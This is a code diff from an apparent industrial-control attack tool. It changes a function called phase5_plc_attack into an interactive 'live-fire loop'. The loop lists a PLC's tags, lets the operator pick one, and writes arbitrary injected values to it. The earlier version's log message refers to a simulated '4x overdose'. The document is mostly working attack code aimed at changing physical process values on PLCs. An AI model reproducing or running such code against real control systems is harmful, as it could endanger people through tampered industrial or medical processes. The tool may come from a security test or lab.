@@ -1189,11 +1189,10 @@ def phase5_plc_attack() -> PhaseResult:
             )
 
         try:
-            # ── Tag enumeration ───────────────────────────────────────────────
+            # ── Tag enumeration (runs once, table reused in loop) ─────────────
             info("Enumerating PLC tag list...")
             all_tags = plc_conn.get_tag_list()
 
-            # get_tag_list() returns dicts: {"tag_name": ..., "data_type": ..., ...}
             def _tname(t) -> str:
                 return t.get("tag_name", "") if isinstance(t, dict) else str(getattr(t, "tag_name", ""))
             def _ttype(t) -> str:
@@ -1204,59 +1203,95 @@ def phase5_plc_attack() -> PhaseResult:
                 if any(kw in _tname(t).lower() for kw in INTERESTING)
                 and _ttype(t).upper() in NUMERIC_TYPES
             ]
-
-            tag_table = Table(
-                title="[bold magenta]Discovered PLC Tags (Filtered)[/bold magenta]",
-                show_header=True, header_style="bold cyan", border_style="dim",
-            )
-            tag_table.add_column("Tag Name",  style="green",  width=36)
-            tag_table.add_column("Data Type", style="yellow", width=12)
-            for t in filtered:
-                tag_table.add_row(_tname(t), _ttype(t))
-            console.print(tag_table)
-
+            # Fall back to first 40 raw tags if nothing interesting matched
+            display_tags = filtered if filtered else all_tags[:40]
             if not filtered:
-                warn("No interesting tags matched — showing first 40 raw tags:")
-                all_table = Table(show_header=True, header_style="bold cyan", border_style="dim")
-                all_table.add_column("Tag Name",  style="dim green",  width=36)
-                all_table.add_column("Data Type", style="dim yellow", width=12)
-                for t in all_tags[:40]:
-                    all_table.add_row(_tname(t), _ttype(t))
-                console.print(all_table)
+                warn("No interesting tags matched — showing first 40 raw tags")
 
-            # ── Validate configured tag; prompt if missing ────────────────────
-            probe = plc_conn.read(tag)
-            if probe is None or probe.value is None:
-                warn(f"Configured tag '{tag}' returned None.")
-                console.print()
-                tag = Prompt.ask(
-                    "[yellow]Enter the correct tag name from the table above[/yellow]"
+            def _render_tag_table():
+                tbl = Table(
+                    title="[bold magenta]PLC Tags — Filtered[/bold magenta]",
+                    show_header=True, header_style="bold cyan", border_style="dim",
                 )
+                tbl.add_column("#",         style="dim",    width=4)
+                tbl.add_column("Tag Name",  style="green",  width=38)
+                tbl.add_column("Data Type", style="yellow", width=12)
+                for i, t in enumerate(display_tags, 1):
+                    tbl.add_row(str(i), _tname(t), _ttype(t))
+                console.print(tbl)
+
+            # ── Live-fire loop — tunnel + connection stay open throughout ──────
+            payloads_fired: list[str] = []
+
+            while True:
+                _render_tag_table()
+
+                # ── Index-based tag selection ─────────────────────────────────
+                console.print()
+                raw_idx = Prompt.ask(
+                    f"[yellow]Select tag by number (1–{len(display_tags)})[/yellow]"
+                )
+                try:
+                    idx = int(raw_idx.strip()) - 1
+                    if not (0 <= idx < len(display_tags)):
+                        raise ValueError
+                    tag = _tname(display_tags[idx])
+                except ValueError:
+                    warn("Invalid selection — try again")
+                    continue
+
                 CFG["plc"]["tag"] = tag
-                ok(f"Tag updated → [bold]{tag}[/bold]")
 
-            # ── Read → Write → Verify ─────────────────────────────────────────
-            before = plc_conn.read(tag)
-            info(f"Before: {tag} = {before.value}")
+                # ── Read current value ────────────────────────────────────────
+                cur_result = plc_conn.read(tag)
+                cur_val    = cur_result.value if cur_result else "unknown"
+                ok(f"Current value of [bold]{tag}[/bold]: [bold yellow]{cur_val}[/bold yellow]")
 
-            plc_conn.write((tag, atk_val))
+                # ── Prompt for injection value ────────────────────────────────
+                console.print()
+                raw_val = Prompt.ask(
+                    f"[red]Enter value to inject into [bold]{tag}[/bold] "
+                    f"(current: [bold yellow]{cur_val}[/bold yellow])[/red]"
+                )
+                try:
+                    # Cast to same type as current value when possible
+                    if isinstance(cur_val, float):
+                        inject_val = float(raw_val)
+                    elif isinstance(cur_val, int):
+                        inject_val = int(raw_val)
+                    else:
+                        inject_val = raw_val
+                except ValueError:
+                    inject_val = raw_val
 
-            after = plc_conn.read(tag)
-            info(f"After : {tag} = {after.value}")
+                # ── Fire ──────────────────────────────────────────────────────
+                before = plc_conn.read(tag)
+                info(f"Before : {tag} = {before.value}")
+
+                plc_conn.write((tag, inject_val))
+
+                after = plc_conn.read(tag)
+                ok(f"After  : [bold]{tag}[/bold] = [bold green]{after.value}[/bold green]")
+
+                payloads_fired.append(f"{tag}: {before.value} → {after.value}")
+
+                # ── Deploy another? ───────────────────────────────────────────
+                console.print()
+                if not Confirm.ask("[red]Deploy another payload?[/red]", default=False):
+                    break
 
         finally:
             plc_conn.close()
 
-        if after.value == atk_val:
+        if payloads_fired:
             r.status  = "success"
-            r.finding = f"{tag} written: {before.value} → {after.value} (4x overdose simulated)"
+            r.finding = "Payloads fired: " + " | ".join(payloads_fired)
             ok(r.finding)
         else:
-            r.status  = "success"
-            r.finding = f"CIP Write sent — read back {after.value}, verify on PLC/Grafana"
-            warn(r.finding)
+            r.status  = "skipped"
+            r.finding = "No payloads deployed"
 
-        r.output = f"Before: {before.value}  After: {after.value}"
+        r.output = "\n".join(payloads_fired)
 
     except Exception as e:
         r.status  = "failed"
